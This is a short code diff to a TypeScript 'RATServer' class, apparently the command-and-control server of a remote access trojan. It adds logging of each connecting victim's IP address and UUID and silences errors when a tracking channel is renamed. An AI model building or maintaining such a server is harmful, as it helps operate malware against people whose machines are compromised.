@@ -38,6 +38,7 @@ export default class RATServer implements ITCPServer {
             }
             // if first time client connects, initiates first time connection
             if (packet?.code === Code.ASK_UUID) {
+                console.log(`[RAT SERVER] New client first connect with IP ${socket.remoteAddress}`);
                 client.firstTimeConnect();
                 return;
             } else if (packet?.code === Code.AUTH_UUID) {
@@ -54,6 +55,7 @@ export default class RATServer implements ITCPServer {
                 }
 
                 const uuid = packet.payload.toString();
+                console.log(`[RAT SERVER] New client connected with UUID ${uuid}`);
                 client.connect(uuid);
                 return;
             }
@@ -113,6 +115,8 @@ export default class RATServer implements ITCPServer {
             console.log(`Channel with ID ${user.channelId} not found - Deletion`);
             return;
         }
-        await channel.setName(`🔴${channel.name.substring(2, channel.name.length)}`);
+        try {
+            await channel.setName(`🔴${channel.name.substring(2, channel.name.length)}`);
+        } catch(error) {}
     }
 }
